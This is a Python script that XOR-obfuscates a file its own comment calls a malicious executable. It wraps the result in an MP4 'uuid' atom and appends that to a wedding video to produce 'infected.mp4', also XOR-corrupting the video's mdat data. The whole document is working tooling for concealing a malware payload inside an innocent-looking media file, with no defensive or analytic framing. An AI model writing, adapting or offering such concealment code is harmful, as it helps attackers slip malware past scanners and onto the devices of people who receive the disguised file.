malware_name = 'sample.exe'
video_name = 'wedding.mp4'
infected_video_name = 'infected.mp4'
hex_string = "91f2e65c35ff4e299599dc83d3d59ec4" #CUSTOM UUID (random 16 bytes)

#################
# 1. XOR malware
#################

def xor_data(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes([b ^ key[i % key_len] for i, b in enumerate(data)])

with open(malware_name, 'rb') as f: #malicious exe
    exe_data = f.read()

key = bytes.fromhex(hex_string)
xor_payload = xor_data(exe_data, key)
xor_bin_name = 'evil_xored.bin'

with open(xor_bin_name, 'wb') as f:
    f.write(xor_payload)

print(f'{xor_bin_name} created with key 0x{hex_string}')

#################
# 2. Build UUID atom
#################

import struct
import uuid

with open(xor_bin_name, 'rb') as f:
    xor_payload = f.read()
atom_type = b'uuid'

# Total size: 4 (size) + 4 (type) + 16 (UUID) + payload
total_size = 4 + 4 + 16 + len(xor_payload)

# Build atom binary
uuid_atom = struct.pack(">I", total_size) + atom_type + key + xor_payload

uuid_bin_name = 'uuid_atom.bin'
with open(uuid_bin_name, 'wb') as f:
    f.write(uuid_atom)

print(f'{uuid_bin_name} created with UUID: {uuid.UUID(bytes=key)} and size {total_size} bytes')

#################
# 3. Embed UUID atom
#################

with open(video_name, 'rb') as vid, open(uuid_bin_name, 'rb') as atom:
    video_data = bytearray(vid.read())
    uuid_atom_data = atom.read()

mdat_index = video_data.find(b'mdat')
if mdat_index != -1:
    size_start = mdat_index - 4
    atom_size = struct.unpack('>I', video_data[size_start:mdat_index])[0]
    mdat_payload_start = mdat_index + 4
    mdat_payload_end = size_start + atom_size
    mdat_payload = bytes(video_data[mdat_payload_start:mdat_payload_end])
    xor_payload = xor_data(mdat_payload, key)
    video_data[mdat_payload_start:mdat_payload_end] = xor_payload
    with open(infected_video_name, 'wb') as out:
        out.write(video_data + uuid_atom_data)
    
    print(f"{infected_video_name} embedded with UUID atom, and mdat atom has been corrupted.")
else:
    print("No mdat atom found! Something went wrong.")

